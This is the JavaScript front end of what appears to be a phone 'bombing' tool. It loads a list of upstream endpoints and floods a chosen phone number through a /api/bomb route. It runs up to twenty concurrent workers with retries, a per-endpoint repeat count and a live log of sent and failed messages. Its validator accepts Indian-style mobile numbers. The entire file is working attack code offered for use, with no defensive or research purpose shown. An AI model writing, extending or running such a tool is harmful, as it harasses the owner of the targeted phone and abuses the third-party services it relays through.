'use strict';

let endpoints = [];
let running = false;
let stats = { sent: 0, fail: 0, active: 0, startedAt: 0 };
let abortController = null;

const $ = id => document.getElementById(id);
const targetEl = $('target');
const perEndpointEl = $('perEndpoint');
const delayEl = $('delay');
const workersEl = $('workers');
const endpointCountEl = $('endpointCount');
const startBtn = $('startBtn');
const stopBtn = $('stopBtn');
const logEl = $('log');

function log(msg, cls = 'info') {
  const t = new Date().toLocaleTimeString('en-GB', { hour12: false });
  const line = document.createElement('div');
  line.className = cls;
  line.textContent = `[${t}] ${msg}`;
  logEl.appendChild(line);
  logEl.scrollTop = logEl.scrollHeight;
  while (logEl.children.length > 500) logEl.removeChild(logEl.firstChild);
}

function renderStats() {
  $('statSent').textContent = stats.sent;
  $('statFail').textContent = stats.fail;
  $('statActive').textContent = stats.active;
  const elapsed = stats.startedAt ? ((Date.now() - stats.startedAt) / 1000).toFixed(1) + 's' : '0s';
  $('statTime').textContent = elapsed;
}

async function fetchEndpoints() {
  const res = await fetch('/api/stats');
  if (!res.ok) throw new Error(`stats failed (${res.status})`);
  const data = await res.json();
  return data.endpoints || [];
}

async function fireOne(endpointId, phone, retries = 1) {
  if (!running) return;

  stats.active++;
  renderStats();

  let shouldRetry = false;

  try {
    const res = await fetch('/api/bomb', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ endpointId, phone }),
      signal: abortController?.signal
    });

    const data = await res.json();

    if (data.ok) {
      stats.sent++;
      log(`✓ ${endpointId} → ${data.upstreamStatus} (${data.latencyMs}ms)`, 'ok');
    } else if (
      (data.upstreamStatus === 'timeout' || data.upstreamStatus === 'network_error') &&
      retries > 0
    ) {
      shouldRetry = true;
      log(`↻ ${endpointId} → retry after ${data.upstreamStatus}`, 'info');
    } else {
      stats.fail++;
      log(`✗ ${endpointId} → ${data.upstreamStatus} (${data.latencyMs}ms)`, 'fail');
    }
  } catch (err) {
    if (err.name === 'AbortError') {
      log(`⏹ ${endpointId} → aborted`, 'info');
    } else {
      stats.fail++;
      log(`✗ ${endpointId} → ${err.message}`, 'fail');
    }
  } finally {
    stats.active--;
    renderStats();
  }

  if (shouldRetry) {
    await new Promise(r => setTimeout(r, 500));
    return fireOne(endpointId, phone, retries - 1);
  }
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function worker(phone, perEndpoint, delay, queueRef) {
  while (running && queueRef.i < endpoints.length * perEndpoint) {
    const idx = queueRef.i++;
    const endpointId = endpoints[idx % endpoints.length];
    await fireOne(endpointId, phone);
    if (delay > 0) await sleep(delay);
  }
}

function validate(number) {
  return /^[6-9]\d{9}$/.test(number);
}

async function runBombing() {
  const phone = targetEl.value.trim();
  const perEndpoint = Math.max(1, parseInt(perEndpointEl.value, 10) || 1);
  const delay = Math.max(0, parseInt(delayEl.value, 10) || 0);
  const workers = Math.max(1, Math.min(20, parseInt(workersEl.value, 10) || 1));

  if (!validate(phone)) {
    log('✗ invalid number — 10 digits, starts 6-9', 'fail');
    return;
  }

  if (!endpoints.length) {
    log('✗ endpoints not loaded — refresh page', 'fail');
    return;
  }

  running = true;
  abortController = new AbortController();
  stats = { sent: 0, fail: 0, active: 0, startedAt: Date.now() };
  renderStats();

  startBtn.disabled = true;
  stopBtn.disabled = false;

  log(`▶ starting → ${phone} | ${perEndpoint}x per endpoint | ${workers} workers | ${delay}ms delay`, 'info');
  log(`▶ endpoints loaded: ${endpoints.length}`, 'info');

  const queueRef = { i: 0 };
  const timer = setInterval(renderStats, 200);

  try {
    const promises = [];
    for (let w = 0; w < workers; w++) {
      promises.push(worker(phone, perEndpoint, delay, queueRef));
    }
    await Promise.all(promises);
  } finally {
    clearInterval(timer);
    running = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    renderStats();
    log(`■ done — ${stats.sent} sent, ${stats.fail} failed`, 'info');
  }
}

startBtn.addEventListener('click', runBombing);

stopBtn.addEventListener('click', () => {
  if (!running) return;
  running = false;
  abortController?.abort();
  log('⏹ stop requested', 'fail');
});

$('clearLog').addEventListener('click', () => { logEl.innerHTML = ''; });

(async () => {
  try {
    endpoints = await fetchEndpoints();
    endpointCountEl.value = `${endpoints.length} loaded`;
    log(`✓ ready — ${endpoints.length} endpoints loaded`, 'ok');
  } catch (err) {
    endpointCountEl.value = 'failed';
    log(`✗ could not load endpoints: ${err.message}`, 'fail');
  }
})();
